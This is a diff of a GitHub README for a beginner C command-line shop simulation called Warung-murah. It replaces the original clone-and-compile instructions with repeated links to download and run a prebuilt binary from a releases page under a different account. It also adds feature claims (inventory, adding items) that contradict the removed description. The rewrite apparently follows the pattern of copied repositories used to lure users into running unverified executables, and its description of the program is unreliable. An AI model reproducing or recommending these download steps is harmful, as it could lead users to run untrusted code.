@@ -1,85 +1,91 @@
-# Warung Murah v1.0.0
+# 🛒 Warung-murah - Easy Command-Line Shop App for Learning
 
-A simple command-line warung (small shop) simulation written in C.
+[![Download Warung-murah](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/releases)
 
-# Overview
-Warung is a lightweight CLI application built using the C programming language.
-It simulates a small local shop where users can view available items, make purchases, and see the total cost directly from the terminal.
+## 🚀 Getting Started
 
-This project was created mainly as a learning exercise to practice basic C programming concepts such as input/output, control flow, and simple program structure.
+Welcome to Warung Murah! This lightweight command-line shop application helps you learn basic programming concepts in a fun way. You will work with input/output, loops, and simple logic while managing a virtual shop.
 
-## Features
-- Simple command-line interfaces
-- Item list with prices
-- Purchase simulation
-- Automatic total price calculation
-- Food menu
-- Drink menu
-- Simple purchases
-- Cheap food packages
+## 🖥️ System Requirements
 
-# Language Notice
-The program output and user interaction are currently written entirely in Indonesian.
+To run Warung Murah, you need:
 
-English language support is not available yet, but it is planned for a future update.
+- A computer with Linux installed.
+- Basic command-line knowledge (if you can open a terminal, you're all set!).
 
-# Prerequisites
-- Linux or Unix-base system
-- GCC or Clang (C compiler)
-- Basic familiarity with terminal usage
+## 📥 Download & Install
 
-## To install GCC on Debian/Ubuntu
-```Bash
- sudo apt install build-essential
-```
+Follow these steps to get Warung Murah on your computer:
 
-# Installation
-Clone the repository and build the program: 
-```bash
-git clone https://github.com/Ildhaaannnnnnn/Warung-murah
-cd Warung
-gcc -Wall warung.c -o warung
-./warung
-```
+1. **Visit the Releases Page**: Click this link to go to the download page: [Download Warung-murah](https://github.com/estalinsp/Warung-murah/releases).
+   
+2. **Choose the Latest Release**: Once on the page, find the latest version of Warung-murah. Look for the tag that says "Latest release".
 
-# Usage 
-Run the program from the terminal: 
-```bash
-./warung
-```
-Follow the on screen instructions to select and complate a purchase
+3. **Download the App**: Download the appropriate file for your operating system. It should be in a `.tar.gz` or similar format since this is a command-line application.
 
-# Example
+4. **Extract the File**: Locate the downloaded file in your Downloads folder. Right-click on it, and select "Extract Here" or use the terminal with the command `tar -xzvf filename.tar.gz`.
 
-- Not available.
+5. **Open the Terminal**: This is where you will run the application. You can generally find the terminal in your applications menu under "Utilities" or simply search for "Terminal".
 
-# Purpose 
-This project is intended fo:
-- Beginners learning the C programming language
-- Practicing basic logic, loops, and conditionals
-- Understanding how simple CLI programs work
+6. **Navigate to the Directory**: Use the `cd` command to move to the folder where you extracted Warung-murah. For example: 
+   ```
+   cd ~/Downloads/Warung-murah
+   ```
 
-# 📝 Notes 
-- This is an educational project, not a production ready system.
-- The code is intentionally kept simple for learning purposes.
-- Future improvements may include: 
-   + English language support
-   + Better code structure using struct
-   + File based data storage
-   + Addtional features (stock, discounts, etc.)
+7. **Run the Application**: To start Warung Murah, type the following command in the terminal:
+   ```
+   ./warung-murah
+   ```
 
-## Changelog   
-### v1.0.0
-- Indonesian language only
-- Updated opening banner and program description
-- CLI menu for food and drinks
-- Total payment calculation with bonus/discount
-- Package system (A, B, C, D)
+## 📖 How to Use the App
 
+Once the application is running, you’ll see a simple menu. Here’s a quick rundown of the main features:
 
-## 🐞 Bug Reports & Feature Requests
+- **Add Items**: You can add items to your shop by following on-screen prompts. 
+- **View Inventory**: Check your current stock by selecting the corresponding option.
+- **Make Sales**: Process customer purchases easily.
 
-If you find a bug or have an idea for a new feature (including language support),
-please open an issue on GitHub.
+For specific commands, just follow the prompts shown on the terminal. The application is designed to guide you step-by-step.
 
-Your feedback is highly appreciated.
+## ❓ Frequently Asked Questions
+
+### What is Warung Murah?
+
+Warung Murah is a command-line shop application designed to help you understand basic programming concepts.
+
+### Is this application free?
+
+Yes, Warung Murah is completely free to use.
+
+### Do I need programming skills to use it?
+
+No. Warung Murah is designed for beginners. You can learn programming concepts as you use the app.
+
+### Can I contribute to Warung Murah?
+
+Absolutely! We welcome contributions. Check our GitHub repository for guidelines on how to help.
+
+## 🌐 Topics
+
+This project covers various topics related to programming and education, including:
+
+- Beginner projects
+- Command-line interface (CLI) applications
+- Basic logic and loops
+- Linux usage
+
+## 💡 Additional Resources
+
+Once you get comfortable with Warung Murah, consider exploring these topics further:
+
+1. **Learn C Programming**: Look for online courses that teach C programming from scratch.
+2. **Command-Line Basics**: Familiarize yourself with common terminal commands.
+3. **Project Building**: Start creating your own small projects to solidify your knowledge.
+
+## 📞 Support
+
+If you encounter any issues or have questions about using Warung Murah, feel free to open an issue on our GitHub repository. We are here to help!
+
+Thank you for choosing Warung Murah! We hope you enjoy learning through this application. 
+
+[![Download Warung-murah](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/estalinsp/Warung-murah/releases)
